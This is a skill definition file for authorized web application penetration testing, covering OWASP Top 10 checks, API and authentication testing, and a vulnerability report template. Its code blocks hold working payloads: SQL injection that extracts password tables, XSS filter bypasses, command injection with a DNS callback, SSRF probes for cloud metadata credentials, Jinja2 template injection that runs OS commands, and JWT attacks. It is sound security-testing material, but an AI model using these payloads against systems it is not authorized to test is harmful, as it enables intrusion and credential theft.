---
name: Web Application Security Testing
description: OWASP Top 10 testing, injection vulnerability detection, API security assessment, authentication testing, and web vulnerability reporting for authorized assessments
version: 2.0.0
author: Masriyan
tags: [cybersecurity, web-security, owasp, xss, sqli, api, pentest, burpsuite, authentication]
---

# Web Application Security Testing

## Purpose

Enable Claude to assist with comprehensive web application security assessments covering OWASP Top 10, injection testing, API security, authentication analysis, and client-side security. Claude analyzes application behavior, generates test payloads, reviews source code, and produces structured vulnerability reports.

> **Authorization Required**: All testing must be performed on authorized targets only. Confirm scope and written authorization before testing.

---

## Activation Triggers

This skill activates when the user asks about:
- OWASP Top 10 testing or assessment methodology
- SQL injection, XSS, SSRF, SSTI, command injection testing
- API security testing (REST, GraphQL, SOAP)
- Authentication bypass, session management flaws
- Web application firewall (WAF) bypasses for authorized testing
- CORS, CSP, or security header analysis
- OAuth/OIDC security review
- JWT analysis or manipulation
- Burp Suite or OWASP ZAP usage guidance
- Web vulnerability report writing

---

## Prerequisites

```bash
pip install requests beautifulsoup4 urllib3 lxml
```

**Recommended tools:**
- `Burp Suite Community/Pro` — Web proxy and scanner
- `OWASP ZAP` — Open-source web scanner
- `sqlmap` — Automated SQL injection (authorized use only)
- `Nikto` — Web server scanner
- `ffuf / feroxbuster` — Web fuzzer
- `jwt_tool` — JWT analysis and manipulation

---

## Core Capabilities

### 1. OWASP Top 10 Assessment

**When the user asks to assess for OWASP Top 10 vulnerabilities:**

| # | Vulnerability | Claude's Assessment Approach |
|---|--------------|------------------------------|
| A01 | Broken Access Control | Test IDOR, path traversal, forced browsing, privilege escalation |
| A02 | Cryptographic Failures | Audit TLS, check sensitive data exposure, weak algorithms |
| A03 | Injection | Test all inputs for SQLi, NoSQLi, OS command, LDAP, SSTI |
| A04 | Insecure Design | Review architecture for missing security controls |
| A05 | Security Misconfiguration | Check defaults, error disclosure, directory listing, debug mode |
| A06 | Vulnerable Components | Audit third-party libraries and framework versions |
| A07 | Auth & ID Failures | Test session management, brute force, MFA, credential storage |
| A08 | Software & Data Integrity | Check update mechanisms, deserialization, CI/CD security |
| A09 | Logging & Monitoring Failures | Verify logging coverage and alerting |
| A10 | SSRF | Test URL parameters, webhooks, import functionality |

### 2. Injection Testing

**When the user asks to test for injection vulnerabilities:**

**Input Discovery — Map all injection points:**
```
GET/POST parameters
URL path segments (/users/INJECT/profile)
HTTP headers (X-Forwarded-For, User-Agent, Referer, Cookie)
JSON body fields {"name": "INJECT"}
XML body fields <name>INJECT</name>
GraphQL variables {query: "{ user(name: \"INJECT\") }"}
File upload names and metadata
```

**SQL Injection Testing Methodology:**
```
Step 1: Detection — Test for error-based confirmation
  ' → SQL error = likely vulnerable
  ' OR '1'='1 → true condition
  ' OR '1'='2 → false condition
  ' AND SLEEP(5)-- - → time delay = blind SQLi

Step 2: Fingerprint the database
  ' AND 1=CONVERT(int,@@version)-- - → MSSQL version
  ' AND 1=1 UNION SELECT @@version-- - → MySQL
  ' AND 1=(SELECT 1 FROM dual)-- - → Oracle

Step 3: Extraction (authorized PoC only)
  ' UNION SELECT null,username,password,null FROM users-- -
```

**SQLi Payload Library:**
```sql
-- Basic detection
'
''
`
')
'))
' OR '1'='1'--
' OR 1=1--
" OR "1"="1
' OR 'x'='x

-- MySQL time-based blind
' AND SLEEP(5)-- -
' OR SLEEP(5)=0-- -

-- MSSQL time-based blind
'; WAITFOR DELAY '0:0:5'-- -

-- PostgreSQL time-based blind
'; SELECT pg_sleep(5)-- -

-- Error-based (MySQL)
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

-- UNION enumeration
' ORDER BY 1-- -  (increment until error to find column count)
' UNION SELECT null-- -
' UNION SELECT null,null-- -
' UNION SELECT null,null,null-- -
```

**XSS Testing Methodology:**
```
Step 1: Find reflection points
  Input: test123  →  Search in source for "test123"
  What HTML context is it in?
    • HTML content: <p>test123</p>
    • Attribute: <input value="test123">
    • JavaScript: var x = "test123";
    • URL: href="test123"

Step 2: Test basic payload for context
  HTML content:    <script>alert(1)</script>
  Attribute:       " onmouseover="alert(1)
  JavaScript:      ";alert(1);//
  URL:             javascript:alert(1)

Step 3: Bypass filters
  Case variation:  <ScRiPt>alert(1)</ScRiPt>
  No parentheses:  <img src=x onerror=alert`1`>
  No script tag:   <img src=x onerror=alert(document.domain)>
  SVG:             <svg onload=alert(1)>
  Template:        {{constructor.constructor('alert(1)')()}}
```

**Command Injection Testing:**
```bash
# Linux injection separators
; id
| id
& id
&& id
`id`
$(id)
%0aid

# Windows injection separators
& whoami
| whoami
; dir
%26 dir

# Blind detection via time delay
; sleep 5
| timeout 5
& ping -n 5 127.0.0.1

# Blind detection via DNS callback (use Burp Collaborator or interactsh)
; nslookup YOUR-CALLBACK-DOMAIN.com
```

**SSRF Testing Methodology:**
```
Step 1: Find URL input points
  - Import functionality (import from URL)
  - Webhooks (send notification to URL)
  - Document converters (URL to PDF)
  - Image loading from URL
  - API calls with URL parameters

Step 2: Test basic SSRF to internal resources
  http://127.0.0.1/
  http://localhost/
  http://192.168.1.1/           # Default gateway
  http://169.254.169.254/       # AWS metadata
  http://metadata.google.internal/  # GCP metadata
  http://[::1]/                 # IPv6 localhost

Step 3: Test cloud metadata services (AWS example)
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

Step 4: SSRF filter bypass techniques
  http://127.0.0.1@evil.com     # URL confusion
  http://0177.0.0.1/            # Octal encoding
  http://2130706433/            # Decimal encoding
  http://[::1]/                 # IPv6
  http://localhost.evil.com/    # DNS rebinding
```

**SSTI Testing:**
```
# Universal detection probes
{{7*7}}           → 49 (Jinja2, Twig, Freemarker)
${7*7}            → 49 (FreeMarker, Velocity, Mako)
<%= 7*7 %>        → 49 (ERB/Ruby)
#{7*7}            → 49 (Pug/Jade)

# Jinja2 (Python Flask) — confirm RCE path
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP Symfony)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### 3. API Security Testing

**When the user asks to test API security:**

**API Test Checklist:**
```
Authentication:
[ ] Endpoints accessible without token? (missing auth)
[ ] JWT validation: alg:none attack, weak secret, expired token accepted?
[ ] API keys in URL parameters (logged in proxy logs)
[ ] Basic auth over HTTP (not HTTPS)

Authorization:
[ ] BOLA — Change object ID to access other users' data
  GET /api/users/123/orders → try /api/users/124/orders
[ ] Mass assignment — POST with extra privileged fields
  {"username":"user","role":"admin","isAdmin":true}
[ ] Function-level access — access admin endpoints as regular user
  GET /api/admin/users (as non-admin)

Input Validation:
[ ] SQL injection in API parameters
[ ] JSON injection in body
[ ] Rate limiting — rapid requests cause DoS or bypass?
[ ] Request body schema — what happens with extra/unexpected fields?

Data Exposure:
[ ] Response contains sensitive fields not needed by client?
[ ] User A can see User B's PII?
[ ] Error messages reveal internal structure?
[ ] Debug endpoints exposed? /api/debug, /api/swagger, /api/docs
```

**GraphQL-specific tests:**
```graphql
# Introspection — should be disabled in production
{ __schema { types { name fields { name } } } }

# Batch query abuse
[{"query":"{ user(id:1) { name } }"},
 {"query":"{ user(id:2) { name } }"},
 ...repeated 1000 times...]

# Circular query DoS
{ user { friends { friends { friends { name } } } } }
```

**JWT Analysis:**
```bash
# Decode JWT without verification
jwt_tool JWT_TOKEN_HERE -d

# Test alg:none attack
jwt_tool JWT_TOKEN_HERE -X a

# Test algorithm confusion (RS256 to HS256)
jwt_tool JWT_TOKEN_HERE -X k -pk public.pem

# Brute force weak secret
jwt_tool JWT_TOKEN_HERE -C -d /usr/share/wordlists/rockyou.txt
```

### 4. Authentication & Session Testing

**When the user asks to test authentication:**

**Session Token Analysis:**
```
Entropy check:
[ ] Token length sufficient? (≥128 bits recommended)
[ ] Token appears random? (not predictable, sequential, or time-based)
[ ] Test: collect 10+ tokens, check for patterns

Session management:
[ ] Session invalidated on logout? (test by reusing old token)
[ ] Session invalidated on password change?
[ ] Concurrent session limits? (same user, multiple locations)
[ ] Session fixation: set your own session ID before auth, does it persist?
[ ] Secure and HttpOnly flags on session cookie?
[ ] SameSite attribute set? (CSRF protection)

Password security:
[ ] Minimum complexity enforced?
[ ] Account lockout after N failed attempts?
[ ] Password exposed in HTTP response or logs?
[ ] Forgot password link single-use and time-limited?
[ ] Password reset token in URL? (appears in logs/referer)
```

**OAuth 2.0 Testing:**
```
[ ] State parameter present and validated? (CSRF in OAuth flow)
[ ] Redirect URI strictly validated? (open redirect)
[ ] Authorization code reusable? (should be single-use)
[ ] PKCE implemented for public clients?
[ ] Client secret exposed in JavaScript source?
[ ] Scope validation — can client request broader scopes than expected?
```

### 5. Security Headers Assessment

**When the user asks to review security headers:**

```python
# Check all security headers for a target
import requests
headers_to_check = {
    "Strict-Transport-Security": "Required; max-age>=31536000",
    "Content-Security-Policy": "Required; restrict sources",
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY or SAMEORIGIN",
    "Referrer-Policy": "strict-origin-when-cross-origin",
    "Permissions-Policy": "Restrict sensitive features",
    "Cache-Control": "no-store for sensitive endpoints",
}
```

**CORS Misconfiguration Tests:**
```python
# Test 1: Arbitrary origin reflected
requests.get(url, headers={"Origin": "https://evil.com"})
# Vulnerable if response contains: Access-Control-Allow-Origin: https://evil.com

# Test 2: Null origin
requests.get(url, headers={"Origin": "null"})
# Vulnerable if response contains: Access-Control-Allow-Origin: null

# Test 3: Subdomain bypass
requests.get(url, headers={"Origin": "https://evil.target.com"})
# Vulnerable if attacker can register evil.target.com or use XSS
```

---

## Vulnerability Report Template

```markdown
## Web Security Finding: [Title]

**ID:** WEB-[Number]
**Severity:** [Critical / High / Medium / Low / Info]
**CVSS v3.1:** [Score] | [Vector string]
**CWE:** [CWE-ID — CWE Name]
**OWASP:** [A0X — Category]

### Affected Endpoint
**URL:** `https://target.com/api/endpoint`
**Method:** POST
**Parameter:** `id`

### Description
[Clear description of the vulnerability and why it's a risk]

### Reproduction Steps
1. Navigate to `https://target.com/api/endpoint`
2. Send the following request:
   ```
   POST /api/endpoint HTTP/1.1
   Host: target.com
   Content-Type: application/json

   {"id": "1' OR '1'='1"}
   ```
3. Observe the response contains [evidence of vulnerability]

### Impact
[Business and technical impact — data exposure, account takeover, RCE, etc.]

### Evidence
[Screenshot description, response snippet, or sanitized PoC output]

### Remediation
[Specific fix with code example if applicable]
```

---

## Script Reference

### `owasp_scanner.py`
```bash
python scripts/owasp_scanner.py --url https://target.com --output report.json
python scripts/owasp_scanner.py --url https://target.com --tests a01,a03,a07
```

### `api_security_tester.py`
```bash
python scripts/api_security_tester.py --spec openapi.yaml --base-url https://api.target.com --output results.json
```

---

## Skill Integration

| Condition | Adjacent Skill |
|-----------|---------------|
| Web apps discovered during recon | ← Skill 01 (Recon & OSINT) |
| Vulnerable components identified | → Skill 02 (Vulnerability Scanner) |
| Develop PoC for confirmed vuln | → Skill 03 (Exploit Development) |
| Generate CSOC alerts for findings | → Skill 11 (CSOC Automation) |

---

## References

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks Web Pentesting](https://book.hacktricks.xyz/pentesting-web)
